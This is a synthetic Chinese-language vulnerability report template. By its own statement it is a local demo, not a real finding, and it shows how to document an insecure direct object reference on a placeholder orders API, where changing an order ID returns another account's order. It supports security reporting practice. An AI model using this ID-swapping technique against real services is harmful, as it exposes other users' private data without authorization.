# [HIGH] 订单访问控制缺失（本地合成样例）

- **严重等级**：high
- **状态**：pending
- **发现时间**：2026-10-29 00:00:00
- **生成时间**：2026-10-29 00:00:00

## 概述

仅展示复现步骤格式，不代表真实发现。

## 详细报告

## 分步复现

**入口**：GET https://api.example.test/orders

**前置条件**

- 本地合成演示数据，非真实漏洞；已准备账号A、账号B及各自订单。

### 步骤 1：读取自己的订单作为对照

使用账号A会话读取订单1001，确认正常访问结果。

**请求**

```
GET /orders?id=1001 HTTP/1.1
Host: api.example.test
Authorization: Bearer DEMO_A


```

**响应**

```
HTTP/1.1 200 OK
Content-Type: application/json

{"id":1001,"owner":"A"}
```

**实际结果**：返回账号A自己的订单。

**证明范围**：接口可正常读取本人订单。

未关联流量证据；以上为现场记录。

### 步骤 2：保持会话不变，修改订单编号

仅将订单编号改为账号B的1002，其余请求条件保持一致。

**请求**

```
GET /orders?id=1002 HTTP/1.1
Host: api.example.test
Authorization: Bearer DEMO_A


```

**响应**

```
HTTP/1.1 200 OK
Content-Type: application/json

{"id":1002,"owner":"B"}
```

**实际结果**：返回账号B订单的演示内容。

**证明范围**：演示范围内可跨账号读取指定订单，不推断其他资源。

未关联流量证据；以上为现场记录。


